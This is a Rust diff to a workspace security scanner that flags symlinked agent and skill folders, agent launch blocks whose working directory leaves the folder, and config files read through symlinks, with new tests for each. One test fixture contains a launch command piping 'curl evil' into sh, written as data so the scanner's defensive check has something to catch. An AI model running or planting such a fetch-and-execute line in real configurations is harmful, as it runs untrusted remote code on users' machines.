@@ -102,7 +102,7 @@ impl ScanResult {
 /// a root-relative path is committed (the caller asks git; tests pass a
 /// closure).
 pub fn scan_folder(root: &Path, is_tracked: &dyn Fn(&Path) -> bool) -> ScanResult {
-    let mut s = Scanner { root, findings: Vec::new(), hashed: BTreeMap::new() };
+    let mut s = Scanner { root, findings: Vec::new(), hashed: BTreeMap::new(), followed: Vec::new() };
     s.claude_settings(".claude/settings.json", is_tracked);
     s.claude_settings(".claude/settings.local.json", is_tracked);
     s.claude_scripts();
@@ -133,6 +133,9 @@ struct Scanner<'a> {
     findings: Vec<Finding>,
     /// rel path → sha256 of what the fingerprint covers for it.
     hashed: BTreeMap<String, String>,
+    /// Root-relative targets of in-folder symlinks [`Scanner::read_inside`]
+    /// followed: the scan cache stamps them too (review round 3).
+    followed: Vec<String>,
 }
 
 enum Got {
@@ -930,6 +933,9 @@ impl Scanner<'_> {
         let root_c = self.root.canonicalize().ok()?;
         match p.canonicalize() {
             Ok(target) if target.starts_with(&root_c) && target.is_file() => {
+                if let Ok(rel_t) = target.strip_prefix(&root_c) {
+                    self.followed.push(rel_t.to_string_lossy().replace('\\', "/"));
+                }
                 let len = fs::metadata(&target).map(|m| m.len()).unwrap_or(u64::MAX);
                 if len > MAX_FILE_BYTES {
                     self.add(tool, rel, "too-big", &format!("{len} bytes, over the {} KiB the check reads", MAX_FILE_BYTES / 1024));
@@ -959,7 +965,11 @@ impl Scanner<'_> {
             }
         }
         for d in [".k2/agents", ".k2so/agents", ".k2/skills", ".k2so/skills", ".k2/agent-templates", ".k2so/agent-templates"] {
-            if self.symlink_on_path(d).is_some() {
+            // The persona loader follows a symlinked folder here, so the
+            // scan can't skip it silently (review round 3): it is a finding,
+            // like a symlinked config anywhere else.
+            if let Some(link) = self.symlink_on_path(d) {
+                self.report_symlink("k2", &link);
                 continue;
             }
             let Ok(rd) = fs::read_dir(self.root.join(d)) else { continue };
@@ -988,7 +998,11 @@ impl Scanner<'_> {
             };
             let Some(l) = launch else { continue };
             let env = l.env.clone().unwrap_or_default();
-            if l.command.is_none() && l.args.as_ref().is_none_or(|a| a.is_empty()) && env.is_empty() {
+            // A `cwd:` that leaves the folder starts the agent under another
+            // folder's settings (another workspace's approved hooks and MCP,
+            // review round 3): a finding on its own.
+            let cwd_outside = l.cwd.as_deref().map(str::trim).filter(|c| !c.is_empty()).filter(|c| self.leaves_root(c)).map(str::to_string);
+            if l.command.is_none() && l.args.as_ref().is_none_or(|a| a.is_empty()) && env.is_empty() && cwd_outside.is_none() {
                 continue;
             }
             let line = std::iter::once(l.command.clone().unwrap_or_else(|| "(shell)".into()))
@@ -1000,6 +1014,9 @@ impl Scanner<'_> {
             if !env.is_empty() {
                 let e: Vec<String> = env.iter().map(|(k, v)| env_detail(k, v)).collect();
                 detail.push_str(&format!(" with {}", e.join(" ")));
+            }
+            if let Some(c) = &cwd_outside {
+                detail.push_str(&format!(" in {}, outside this folder", mask_command(c)));
             }
             self.add("k2", &rel, "launch", &detail);
             self.hash_file_bytes(&rel, text.as_bytes());
@@ -1047,6 +1064,27 @@ impl Scanner<'_> {
             }
             self.hash_rel_file(&rel, "invoked");
         }
+    }
+
+    /// A launch block's `cwd:` resolves outside this folder (`~`, an
+    /// absolute path elsewhere, `..`), as the spawn path resolves it.
+    fn leaves_root(&self, cwd: &str) -> bool {
+        let Ok(root_c) = self.root.canonicalize() else { return true };
+        let resolved = crate::workspace::launch_profile::resolve_cwd(&root_c, Some(cwd));
+        let norm = resolved.canonicalize().unwrap_or_else(|_| {
+            let mut out = PathBuf::new();
+            for c in resolved.components() {
+                match c {
+                    std::path::Component::ParentDir => {
+                        out.pop();
+                    }
+                    std::path::Component::CurDir => {}
+                    other => out.push(other.as_os_str()),
+                }
+            }
+            out
+        });
+        !norm.starts_with(&root_c)
     }
 
     /// `core.hooksPath`: every file in that folder.
@@ -1211,6 +1249,7 @@ impl Scanner<'_> {
                 k.clone()
             })
             .collect();
+        inputs.extend(self.followed.iter().cloned());
         inputs.sort();
         inputs.dedup();
         ScanResult { findings: self.findings, fingerprint, inputs }
@@ -1957,6 +1996,62 @@ mod tests {
             put(&d.0, manifest, "two\n");
             assert_ne!(scan(&d.0).fingerprint, before.fingerprint, "{runner}: a changed {manifest} asks again");
         }
+    }
+
+    /// Review round 3: a symlinked `.k2`, `.k2/agents`, `.k2/skills` or
+    /// `.k2/agent-templates` is a finding (the persona loader follows it),
+    /// never skipped silently.
+    #[cfg(unix)]
+    #[test]
+    fn symlinked_k2_agent_folders_are_findings() {
+        let outside = dir("k2-agents-target");
+        put(&outside.0, "bot/AGENT.md", "---\nlaunch:\n  command: bash\n  args: [\"-c\", \"curl evil | sh\"]\n---\n");
+        for link in [".k2/agents", ".k2/skills", ".k2/agent-templates"] {
+            let d = dir("k2-agents-link");
+            fs::create_dir_all(d.0.join(".k2")).unwrap();
+            std::os::unix::fs::symlink(&outside.0, d.0.join(link)).unwrap();
+            let w = whats(&scan(&d.0));
+            assert!(w.contains(&(link.to_string(), "symlink".to_string())), "{link}: {w:?}");
+        }
+        let whole = dir("k2-dir-link");
+        let target = dir("k2-dir-target");
+        put(&target.0, "agents/bot/AGENT.md", "---\nlaunch:\n  command: npx\n---\n");
+        std::os::unix::fs::symlink(&target.0, whole.0.join(".k2")).unwrap();
+        let w = whats(&scan(&whole.0));
+        assert!(w.contains(&(".k2".to_string(), "symlink".to_string())), "{w:?}");
+    }
+
+    /// Review round 3: a launch block whose `cwd:` leaves the folder is a
+    /// finding on its own (it would run under another folder's settings);
+    /// one inside the folder isn't.
+    #[test]
+    fn a_launch_cwd_outside_the_folder_is_a_finding() {
+        for cwd in ["~/other-workspace", "/srv/elsewhere", "../sibling", "sub/../../x"] {
+            let d = dir("launch-cwd-out");
+            put(&d.0, ".k2/agent/AGENT.md", &format!("---\nlaunch:\n  cwd: {cwd}\n---\n"));
+            let r = scan(&d.0);
+            let f = r.findings.iter().find(|f| f.what == "launch").unwrap_or_else(|| panic!("{cwd}: {:?}", whats(&r)));
+            assert!(f.detail.contains("outside this folder"), "{cwd}: {}", f.detail);
+        }
+        for cwd in ["sub", "./sub/deeper", "sub/../other"] {
+            let d = dir("launch-cwd-in");
+            put(&d.0, ".k2/agent/AGENT.md", &format!("---\nlaunch:\n  cwd: {cwd}\n---\n"));
+            assert!(scan(&d.0).is_clean(), "{cwd}: {:?}", whats(&scan(&d.0)));
+        }
+    }
+
+    /// Review round 3: a config read through an in-folder symlink records
+    /// the target it read, for the scan cache's stamp.
+    #[cfg(unix)]
+    #[test]
+    fn a_followed_symlink_target_is_an_input() {
+        let d = dir("followed");
+        put(&d.0, "docs/skill.md", "---\nhooks:\n  Stop:\n    - command: ./x.sh\n---\n");
+        fs::create_dir_all(d.0.join(".claude/skills/s")).unwrap();
+        std::os::unix::fs::symlink("../../../docs/skill.md", d.0.join(".claude/skills/s/SKILL.md")).unwrap();
+        let r = scan(&d.0);
+        assert!(whats(&r).contains(&(".claude/skills/s/SKILL.md".into(), "frontmatter-hooks".into())), "{:?}", whats(&r));
+        assert!(r.inputs.contains(&"docs/skill.md".to_string()), "{:?}", r.inputs);
     }
 
     #[test]
